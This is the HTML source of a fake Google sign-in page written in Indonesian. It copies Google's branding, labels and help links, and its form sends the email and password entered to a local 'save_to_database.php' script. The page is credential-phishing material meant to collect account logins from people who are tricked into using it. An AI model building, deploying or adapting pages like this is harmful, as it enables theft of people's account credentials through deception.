<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Gunakan Akun Google Anda</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 40px 200px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 550px;
            text-align: left;
        }
        .header {
            margin-bottom: 20px;
            text-align: left;
        }
        .header h1 {
            font-size: 30px;
            margin-bottom: 20px;
        
        }
        .header p {
            font-size: 18px;
            margin-bottom: 0;
        }
        .form-group {
            margin-bottom: px;
            text-align: left;
            position: relative;
        }
        .form-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-group input {
    width: 57%;
    padding: 10px;
    font-size: 16px;
    border: 1px solid #ccc;
    border-radius: 5px;
    display: inline-block;
    vertical-align: middle;
    margin-right: 210px; /* Menggeser ke kanan */
    margin-left: 210px; /* Menggeser ke kiri */
}
        .form-group .forgot-password {
            font-size: 12px;
            color: #666;
            text-decoration: none;
            float: left;
            margin-top: 10px;
        }
        .form-group .guest-mode {
            font-size: 12px;
            color: #4285F4;
            text-decoration: none;
            margin-top: 10px;
            display: block;
        }
        .footer {
            font-size: 12px;
            color: #666;
            text-align: center;
        }
        button {
            padding: 12px 30px;
            font-size: 16px;
            cursor: pointer;
            color: #fff;
            background-color: #4285F4;
            border: none;
            border-radius: 60px;
            display: inline-block;
            margin-top: 10px;
            float: right; /* Mengatur tombol ke kanan */
        }
        button:hover {
            background-color: #0053e0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="i.jpeg" alt="Google Icon" style="width: 80px; margin-right: 10px;"> <!-- Ikon Google -->
            <h1>‎ ‎ ‎  Login</h1>
            <p>‎ ‎ ‎ ‎ ‎ Gunakan Akun Google Anda</p>
        </div>
        <form method="post" action="save_to_database.php">
            <div class="form-group">
                <label for="email">‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ </label>
                <input type="text" id="email" name="email" placeholder="Email atau nomor telepon" required>
            </div>
            <div class="form-group">
                <label for="password">‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ </label>
                <input type="password" id="password" name="password" placeholder="Kata sandi" required> <br>
                <style>{color:white;}</style><a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=http%3A%2F%2Fsupport.google.com%2Faccounts%2Fanswer%2F7682439%3Fhl%3Did&ddm=0&dsh=S-1374882313%3A1720292676865245&ec=GAlAdQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=id&authuser=0" class="guest-mode">‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ Lupa email?</a>
            </div>
            <div class="form-group">
                <button type="submit">Masuk</button>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br>
                <br><br><br>
              
            
            </div>
        </form>
        <div class="footer">
        <a href="https://support.google.com/chrome/answer/6130773?hl=id" class="guest-mode">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.</a> <br> | Indonesia | Bantuan | Privasi | Persyaratan
        </div>
    </div>
</body>
</html>
